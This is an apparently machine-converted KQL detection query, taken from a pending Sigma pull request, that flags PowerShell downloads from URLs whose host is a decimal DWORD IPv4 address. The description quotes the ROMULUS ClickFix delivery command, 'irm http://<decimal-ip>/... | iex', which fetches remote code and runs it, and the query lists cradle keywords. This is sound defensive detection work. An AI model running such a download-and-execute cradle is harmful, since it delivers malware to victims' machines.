// PENDING: from an OPEN SigmaHQ pull request. Not reviewed or merged by SigmaHQ yet.
// Pull request: #6668 new: ROMULUS ClickFix delivery platform rules (MSI install, delivery URLs, DeElevate64 Run key, decimal DWORD IP download, Stardock sideload
// Pull request URL: https://github.com/SigmaHQ/sigma/pull/6668
// Pull request author: harperjohnsai
// Change: new rule
// Title: PowerShell Download From Decimal DWORD IP URL
// Sigma ID: 42ec30f7-6b11-4df4-a103-0466a2a4a9bc
// Status: experimental | Level: high
// Author: Harper Johns
// Date: 2026-11-24 | Modified: -
// ATT&CK: execution, T1059.001, command-and-control, T1105, stealth, T1027
// Description: Detects PowerShell download cradles (Invoke-RestMethod, Invoke-WebRequest, their aliases,
//   WebClient) whose URL host is a single 8 to 10 digit decimal number, i.e. an IPv4 address written
//   as a DWORD (http://1450003207/ is 86.109.75.7). The ROMULUS ClickFix delivery platform hands
//   victims `irm http://<decimal-ip>/s/<12 hex> | iex`. Existing rules cover dotted, hexadecimal and
//   octal obfuscated IPs; a plain decimal DWORD host without a leading zero is not matched by them.
// False positives:
//   - Unlikely. Software that deliberately uses DWORD-encoded IP addresses in download URLs.
// References:
//   - https://www.huntress.com/blog/chatgpt-custom-gpts-clickfix-rat
//   - https://blackpointcyber.com/blog/romulus-cncmachinerms/
//   - https://www.forescout.com/blog/romulus-analysis-of-a-new-multi-payload-clickfix-delivery-platform/
// Sigma rule: https://github.com/SigmaHQ/sigma/blob/cd44704e28312f874bfcdfcae656722035f5fc0c/rules/windows/process_creation/proc_creation_win_powershell_download_decimal_dword_ip.yml
// License: Detection Rule License (DRL) 1.1 - https://github.com/SigmaHQ/Detection-Rule-License
// Converted by sigma2kql (target: microsoft_xdr, pySigma 1.5.1, pySigma-backend-kusto 1.0.1)
// Validation: passed (Kusto.Language, Defender schema)
// Machine-generated and not tested against real telemetry. Verify before use as a detection.

DeviceProcessEvents
| where ((FolderPath endswith "\\powershell.exe" or FolderPath endswith "\\pwsh.exe" or FolderPath endswith "\\powershell_ise.exe") or (ProcessVersionInfoOriginalFileName in~ ("PowerShell.EXE", "pwsh.dll", "powershell_ise.EXE"))) and (ProcessCommandLine contains "Invoke-RestMethod" or ProcessCommandLine contains "Invoke-WebRequest" or ProcessCommandLine contains "irm " or ProcessCommandLine contains "iwr " or ProcessCommandLine contains "curl " or ProcessCommandLine contains "wget " or ProcessCommandLine contains "DownloadString" or ProcessCommandLine contains "DownloadFile" or ProcessCommandLine contains "DownloadData") and ProcessCommandLine matches regex "https?://[0-9]{8,10}(?::[0-9]{1,5})?(?:[/\\\\s\"']|$)"
